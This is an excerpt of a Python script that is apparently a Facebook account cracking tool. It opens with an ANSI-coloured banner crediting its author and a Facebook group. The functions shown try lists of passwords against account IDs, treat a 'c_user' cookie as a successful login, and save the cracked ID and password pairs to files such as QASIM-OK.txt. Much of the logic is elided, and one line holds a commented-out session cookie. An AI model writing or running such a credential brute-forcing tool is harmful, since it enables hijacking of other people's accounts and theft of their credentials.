...
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33m      Sayed Qasim Nasimi 

\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32      Sayed qasim nasimi

\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33m Sayed Qasim Nasimi  

\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34m  SHAMAL TECHNICAL

\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92m    QASIM, FREE 

\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m    10.1
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/qasimnasimiofficial.islam65653?mibextid=ZbWKwL');menu()
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mQASIM\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[QASIM-OK] '+ids+' | '+pas+'\033[1;32m')

				open('/sdcard/QASIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[QASIM-CP] '+ids+' | '+pas+'\33[0;97m')

					open('/sdcard/QASIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					...
					print('\33[1;91m[QASIM-CP] '+ids+' | '+pas+'\33[0;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
         ...
         # 'cookie': 'datr=VHlfZBJ1WRSBYiQwVFsmEur6; sb=VHlfZLpo57iAFgE48SpPjIS9',
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m[QASIM-OK] '+cid+' | '+ps+'\033[1;32m')

				open('QASIM-OK.txt', 'a').write(cid+' | '+ps+'\n')
				...
				print('\33[1;31m[QASIM-CP] '+cid+' | '+ps+'\33[0;97m')

				open('QASIM-CP.txt', 'a').write(cid+' | '+ps+'\n')
